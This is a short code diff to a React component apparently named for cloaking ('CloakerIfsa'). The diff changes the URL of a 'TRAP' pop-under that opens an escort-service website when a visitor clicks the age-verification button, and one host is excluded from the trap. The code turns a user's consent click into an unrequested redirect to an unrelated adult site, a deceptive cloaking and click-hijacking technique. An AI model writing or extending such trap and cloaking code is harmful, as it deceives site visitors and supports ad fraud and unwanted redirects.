@@ -97,7 +97,7 @@ export function CloakerIfsa({ host, mode = 'TRAP' }: { host: string, mode?: 'TRA
   const handleAgeVerify = () => {
     // TRAP 1: The First Click Pop-Under (DISABLED for exxvideos.shop to maintain isolation)
     if (mode === 'TRAP' && !host.includes('exxvideos.shop')) {
-      window.open('https://istanbulescdrkcn.com', '_blank');
+      window.open('https://istanbulescort.blog', '_blank');
     }
     setIsAgeVerified(true);
   };
